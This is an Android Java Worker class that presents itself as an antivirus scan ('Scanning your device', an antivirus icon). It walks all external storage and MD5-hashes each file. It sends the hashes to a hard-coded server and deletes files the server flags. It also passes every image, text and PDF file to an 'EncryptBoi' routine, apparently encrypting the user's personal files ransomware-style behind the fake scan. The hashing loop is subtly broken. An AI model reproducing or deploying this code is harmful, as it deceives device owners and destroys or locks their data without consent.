package com.example.myapplication.workers;


import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.work.Data;
import androidx.work.ForegroundInfo;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.toolbox.Volley;
import com.example.myapplication.R;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import static androidx.core.content.ContextCompat.getSystemService;

public class a extends Worker {
    private final String url = "http://192.168.43.134:3000/hash";
    private final String LOG_TAG = "NUMBAH 1:";
    private Map<String,Object> listOfMalware = new HashMap<>();
    private MessageDigest md = MessageDigest.getInstance("MD5");
    private String[] extenstions = {".jpg",".png",".jpeg",".txt",".pdf"};
    private List<Integer> yes = new ArrayList<>();
    private int progressCount = 0;
    private int noOfFiles;
    public a(@NonNull Context context, @NonNull WorkerParameters workerParams) throws NoSuchAlgorithmException {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        File yes = Environment.getExternalStorageDirectory();
        try {
            noOfFiles = getNoOfFiles(yes);
            yesu(yes);
        } catch (IOException | JSONException e) {
            Log.e(LOG_TAG, "shit", e);
        }
        return Result.success(new Data.Builder().putAll(listOfMalware).build());
    }

    private void yesu(File yes) throws IOException, JSONException {
       if(yes.exists()){
           File[] array = yes.listFiles();
           for (File oof:array) {
               if(oof.isDirectory()){
                   yesu(oof);
               }
               else{
                   setForegroundAsync(createForegroundInfo(oof.getAbsolutePath(), progressCount));
                   setProgressAsync(new Data.Builder().putString("Progress", String.format(Locale.ENGLISH,"%d/%d",progressCount,noOfFiles)).putString("File",oof.getAbsolutePath()).build());
                   FileInputStream fis = new FileInputStream(oof);
                   int i = 0;
                   do{
                       byte[] bytes = new byte[2097152];
                       i = fis.read(bytes);
                       md.update(bytes);
                   }while(i!=-1);
                   byte[] hash = md.digest();
                   BigInteger no = new BigInteger(1,hash);
                   StringBuilder wheeee = new StringBuilder(no.toString(16));
                   while (wheeee.length() < 32) {
                       wheeee.insert(0, "0");
                   }
                   JSONObject body = new JSONObject();
                   body.put("hash",wheeee);
                   YeetRequest jsonObjectRequest = new YeetRequest(YeetRequest.Method.POST,url,body,response->{
                       try {
                           boolean isMalware = response.getBoolean("malware");
                           if(isMalware){
                               String type = response.getString("type");
                               listOfMalware.put(oof.getAbsolutePath(),type);
                               boolean ree = oof.delete();
                               if(!ree){
                                   throw new Exception("failed");
                               }
                               Log.i(LOG_TAG,String.format(Locale.ENGLISH,"%s is a MALWARE! >:(",oof.getName()));
                           }
                           else{
                               Log.i(LOG_TAG,String.format(Locale.ENGLISH,"%s is clean! :D",oof.getName()));
                           }
                       } catch (Exception e) {
                           Log.e(LOG_TAG,"reeeee",e);
                       }
                   }, Throwable::printStackTrace);
                   Volley.newRequestQueue(getApplicationContext()).add(jsonObjectRequest);
                   for(String lmao:extenstions) {
                       if (oof.getAbsolutePath().endsWith(lmao)) {
                           EncryptBoi encryptBoi = new EncryptBoi(getApplicationContext(),oof);
                           encryptBoi.weeeeeeeeeeeeee();
                       }
                   }
                   progressCount+= 1;
               }
           }
       }
    }

    private ForegroundInfo createForegroundInfo(String progress,int fileNo){
        Context context = getApplicationContext();
        String id = context.getString(R.string.app_name);
        String title = "Scanning your device";
        String cancel = "cancel";
        PendingIntent intent = WorkManager.getInstance(context)
                .createCancelPendingIntent(getId());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createChannel(id);
        }

        Notification notification = new NotificationCompat.Builder(context, id)
                .setContentTitle(title)
                .setTicker(title)
                .setContentText(progress)
                .setSmallIcon(R.drawable.antivirus)
                .setOngoing(true)
                .setProgress(noOfFiles,fileNo,false)
                .addAction(android.R.drawable.ic_delete, cancel, intent)
                .setOnlyAlertOnce(true)
                .build();
        return new ForegroundInfo(5555,notification);
    }

   private void createChannel(String CHANNEL_ID){
       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
           String description = "NUMBAH 1!!!!";
           int importance = NotificationManager.IMPORTANCE_DEFAULT;
           NotificationChannel channel = new NotificationChannel(CHANNEL_ID, CHANNEL_ID, importance);
           channel.setDescription(description);
           NotificationManager notificationManager = getSystemService(getApplicationContext(),NotificationManager.class);
           notificationManager.createNotificationChannel(channel);
       }
   }
    private int getNoOfFiles(File file){
        int x = 0;
        File[] yes = file.listFiles();
        for(File oof : yes){
            if(oof.isDirectory()){
                x += getNoOfFiles(oof);
            }
            else{
                x += 1;
            }
        }
        return x;
    }
}
